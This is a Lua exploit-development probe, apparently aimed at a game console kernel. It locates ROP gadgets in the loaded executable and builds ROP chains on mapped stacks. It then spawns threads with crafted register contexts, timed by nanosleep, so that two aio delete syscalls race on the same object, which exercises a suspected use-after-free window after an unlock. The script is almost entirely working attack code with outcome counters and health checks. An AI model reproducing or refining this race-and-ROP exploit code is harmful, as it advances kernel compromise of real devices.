-- CRASH_CLASS: HIGH
-- PROBE 718a: two children released by a timer onto the same delete.
--
-- Context: 717a's four infinite spinners starved the whole process (the loader
-- went silent and needed a relaunch), so looping children are out. 713a's plain
-- back-to-back spawn never overlapped either - the first child finished the
-- delete before the second started.
--
-- This probe releases both children with nanosleep instead. Child A sleeps T,
-- child B sleeps T minus the measured spawn gap, so both wake inside the same
-- scheduler tick and contend for the aio table lock. The loser blocks on the
-- lock the winner is holding; when the winner drops it at 8ad6fe63 the loser
-- re-takes it and runs the post-unlock re-lookup - which is exactly the window
-- the 14.20 note describes.
--
-- Each child then exits with thr_exit(431), leaving no spinning thread behind:
--     fn(240 nanosleep, RDI=ts) -> pop rdi,<id page> -> fn(662) -> fn(431)

print("=== PROBE 718a: timer-released delete pair ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] trampoline=0x" .. string.format("%X", fn) .. " pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
print(string.format("[A] eboot=0x%X pop_rax=0x%X pop_rdi=0x%X jmp$=0x%X", ebase, pop_rax or 0, pop_rdi or 0, jmp_g or 0))
if not pop_rax or not pop_rdi or not jmp_g then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}

-- one attempt: create one object, then release two children onto its delete
local function attempt(sleep_a_ns, sleep_b_ns)
    local data = mmap(page)
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then return "create-fail" end
    local idpage = mmap(page)
    wd(idpage, rd(o) or 0)
    local stat_a = mmap(page)
    local stat_b = mmap(page)
    wd(stat_a, 0x77777777)
    wd(stat_b, 0x77777777)
    local spawned = 0
    for k, spec in ipairs({{sleep_a_ns, idpage, stat_a}, {sleep_b_ns, idpage, stat_b}}) do
        local stack = mmap(page*4)
        local base = stack + page*4 - 0x200
        -- the context already enters fn with RAX=240, so the chain starts at the
        -- step after the sleep; listing 240 again here slept twice (probe 718a v1)
        wq(base,     uint64(pop_rdi))
        wq(base+8,   uint64(idpage))
        wq(base+16,  uint64(pop_rax))
        wq(base+24,  uint64(662))          -- aio delete
        wq(base+32,  uint64(fn))
        wq(base+40,  uint64(pop_rax))
        wq(base+48,  uint64(431))          -- thr_exit
        wq(base+56,  uint64(fn))
        wq(base+64,  uint64(jmp_g))
        local ts = mmap(page)
        wq(ts, uint64(0))
        wq(ts+8, uint64(spec[1]))
        local ctx = memory.alloc(0x500)
        zero(ctx, 0x500)
        wq(ctx+Ctx.MAGIC, uint64(0x480))
        wq(ctx+Ctx.TYPE, uint64(0x10000))
        wq(ctx+Ctx.CS, uint64(0x43))
        wq(ctx+Ctx.SS, uint64(0x3B))
        wq(ctx+Ctx.RIP, uint64(fn))
        wq(ctx+Ctx.RSP, uint64(base))
        wq(ctx+Ctx.RDI, uint64(ts))
        wq(ctx+Ctx.RSI, uint64(1))         -- aio count for the delete
        wq(ctx+Ctx.RDX, uint64(spec[3]))   -- aio status page
        wq(ctx+Ctx.RAX, uint64(240))       -- first call is nanosleep
        local tb = memory.alloc(8)
        wq(tb, uint64(0))
        local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
        if ok and to_num(rv) == 0 then spawned = spawned + 1
        else print(string.format("    spawn %d ok=%s rv=%s", k, tostring(ok), tostring(to_num(rv)))) end
    end
    if spawned < 2 then return "spawn-fail" end
    local ts2 = memory.alloc(16)
    wq(ts2, 0); wq(ts2+8, 260000000)
    pcall(function() mk(240)(uint64(ts2), uint64(0)) end)
    return string.format("%08X/%08X", rd(stat_a) or 0, rd(stat_b) or 0)
end

local T = 80000000
local both0, lie, one, weird, fail = 0, 0, 0, 0, 0
for i=1,40 do
    local res = attempt(T, T - 1500000)
    local a, b = (res or ""):match("^(%x+)/(%x+)$")
    if a then
        a = tonumber(a, 16); b = tonumber(b, 16)
        if a == 0 and b == 0 then both0 = both0 + 1
        elseif (a == 0 and b == 0x80020003) or (b == 0 and a == 0x80020003) then one = one + 1
        elseif a == 0x77777777 or b == 0x77777777 then lie = lie + 1
        else weird = weird + 1; print(string.format("    round %d odd: %s", i, res)) end
        if i % 8 == 0 then print(string.format("[B] round %d both0=%d one=%d untouched=%d odd=%d", i, both0, one, lie, weird)) end
    else
        fail = fail + 1
        print(string.format("    round %d %s", i, tostring(res)))
    end
end
print(string.format("[C] both0=%d one=%d untouched=%d odd=%d fail=%d", both0, one, lie, weird, fail))

local bad = 0
for n=1,6 do
    local data = mmap(page)
    local o = mmap(page)
    local p = mmap(page)
    local s = mmap(page)
    local ok1, rv1 = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    local ok2, rv2 = pcall(function() return mk(664)(uint64(o), uint64(1), uint64(p)) end)
    wd(s, 0x77777777)
    local ok3, rv3 = pcall(function() return mk(662)(uint64(o), uint64(1), uint64(s)) end)
    local st = rd(p) or 0
    if not (ok1 and ok2 and ok3 and to_num(rv1)==0 and to_num(rv2)==0 and to_num(rv3)==0 and st==3 and (rd(s) or 0)==0) then
        bad = bad + 1
        print(string.format("    health %d poll=%08X status=%08X", n, st, rd(s) or 0))
    end
end
print(string.format("[D] health bad=%d/6 alive=%d", bad, to_num(native.fcall_with_rax(fn_ud, 20))))
